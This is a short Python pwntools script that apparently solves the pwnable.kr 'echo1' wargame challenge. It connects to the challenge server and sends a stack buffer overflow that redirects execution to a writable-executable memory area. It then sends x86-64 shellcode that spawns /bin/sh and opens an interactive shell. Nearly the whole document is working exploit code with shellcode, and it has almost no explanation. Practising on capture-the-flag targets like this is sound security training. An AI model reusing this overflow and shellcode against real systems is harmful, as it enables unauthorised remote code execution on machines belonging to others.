#We will use the area with permission of rwx!
#stack overflow!

from pwn import *
#p=process("./echo1")
p=remote("pwnable.kr",'9010')
print(p.recv(1024))
payload1="heeyeon"
p.send(payload1+"\n")
print(p.recv(1024))
p.send("1\n")
#raw_input()
payload2="a"*32
payload2+=p64(0x602100)+p64(0x400837)
p.send(payload2+"\n")

payload3="\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05"
payload3+="b"*(0x28-len(payload3))
payload3+=p64(0x6020e0)
p.send(payload3+"\n")

p.interactive()
p.close()

